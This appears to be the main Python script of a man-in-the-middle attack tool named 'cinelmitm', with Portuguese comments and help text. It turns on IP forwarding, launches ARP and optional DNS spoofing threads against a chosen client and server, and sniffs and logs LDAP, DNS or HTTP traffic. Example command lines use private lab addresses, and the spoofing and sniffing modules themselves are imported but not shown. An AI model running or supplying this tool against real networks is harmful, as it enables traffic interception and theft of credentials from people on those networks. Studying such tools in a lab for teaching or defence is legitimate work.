from sniffer import *
from arp_spoof import *
from dns_spoof import *
from banner import *
import threading
import os
import time
import signal
import sys
import argparse
from scapy.all import Ether, getmacbyip


# Define colors for terminal output
RESET = '\033[0m'
CYAN = '\033[38;5;50m'
BLUE = '\033[0;38;5;12m'
LGREEN = '\033[38;5;119m'
ORANGE = '\033[38;5;208m'
RED = '\033[38;5;196m'

# Global stop event
stop_event = threading.Event()


def enableForwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disableForwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def signal_handler(sig, frame):
    print("\nCTRL+C Detetado! A parar programa...")
    stop_event.set()
    sys.exit(0)


def main(args):
    meu_mac  = Ether().src
    cli_ip   = args.cliente
    srv_ip   = args.servidor
    spoof_op = args.spoof
    sniff_op = args.sniff
    logfile  = args.log
    delay    = args.delay
    cli_mac, srv_mac = None, None

    while not cli_mac:
        cli_mac = getmacbyip(cli_ip)
        time.sleep(1)

    while not srv_mac:
        srv_mac = getmacbyip(srv_ip)
        time.sleep(1)

    if os.name == "posix":
        enableForwarding()

    if spoof_op == 'arp':
        spoofer_thread = threading.Thread(target=arp_spoofer, args=(meu_mac, cli_ip, srv_ip, cli_mac, srv_mac, delay, stop_event))
        spoofer_thread.daemon = True
        spoofer_thread.start()
    elif spoof_op == 'dns':
        alvos = lista_de_alvos()
        spoofer_thread = threading.Thread(target=arp_spoofer, args=(meu_mac, cli_ip, srv_ip, cli_mac, srv_mac, delay, stop_event))
        spoofer_thread.daemon = True
        spoofer_thread.start()
        dns_spoof_thread = threading.Thread(target=dns_spoof, args=(alvos, cli_ip))
        dns_spoof_thread.daemon = True
        dns_spoof_thread.start()
    else:
        print(f"{RED} ICMP redirect ainda nao implementado. A terminar...{RESET}")
        exit(0)

    sniff_thread = threading.Thread(target=sniff_packets, args=(cli_ip, srv_ip, sniff_op, stop_event))
    sniff_thread.daemon = True
    sniff_thread.start()

    if logfile:
        print(f"{ORANGE}[*]{BLUE} A iniciar logging...")
        logging_thread = threading.Thread(target=log, args=(delay, stop_event))
        logging_thread.daemon = True
        logging_thread.start()

    signal.signal(signal.SIGINT, signal_handler)  # Controla o CTRL+C

    try:
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print("CTRL+C detetado! A terminar...")
    finally:
        stop_event.set()
        if spoofer_thread.is_alive():
            spoofer_thread.join(timeout=0.5)
        if sniff_thread.is_alive():
            sniff_thread.join(timeout=0.5)
        if logfile and logging_thread.is_alive():
            logging_thread.join(timeout=0.5)
#        if spoof_op == 'dns':
#            dns_spoof.cleanup()
        disableForwarding()


def Arghelp():
    parser = argparse.ArgumentParser(
        prog="cinelmitm",
        description="Ataques MITM com opções de spoofing/sniffing.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog=(
            "Exemplos:\n"
            "  python cinelmitm.py -c 10.1.2.1 -s 10.1.2.200 -spoof arp -sniff ldap -log\n"
            "  python cinelmitm.py -c 10.1.2.1 -s 10.1.1.200 -spoof dns\n"
        ),
    )

    req = parser.add_argument_group("Obrigatórios")
    req.add_argument("-c", "--cliente", required=True, metavar="IP_CLIENTE",
                     help="IP do cliente/origem")
    req.add_argument("-s", "--servidor", required=True, metavar="IP_SERVIDOR",
                     help="IP do servidor/destino")

    opt = parser.add_argument_group("Opcionais")
    opt.add_argument("-spoof", choices=["arp", "dns", "icmp"], default="arp",
                     help="Técnica de spoofing")
    opt.add_argument("-sniff", choices=["ldap", "dns", "http", "def"], default="def",
                     help="Modo de sniffing")
    opt.add_argument("-delay", type=int, default=33,
                     help="Atraso em ms entre pacotes")
    opt.add_argument("-log", action="store_true",
                     help="Ativar logging para ficheiro/console")

    return parser


def get_args(argv=None):
    argumentos = Arghelp()
    # Se for executado sem argumentos, mostra help e sai com código 0
    argv = sys.argv[1:] if argv is None else argv
    if not argv:
        argumentos.print_help()
        argumentos.exit(0)
    return argumentos.parse_args(argv)


if __name__ == '__main__':
    print_banner()
    main(get_args())
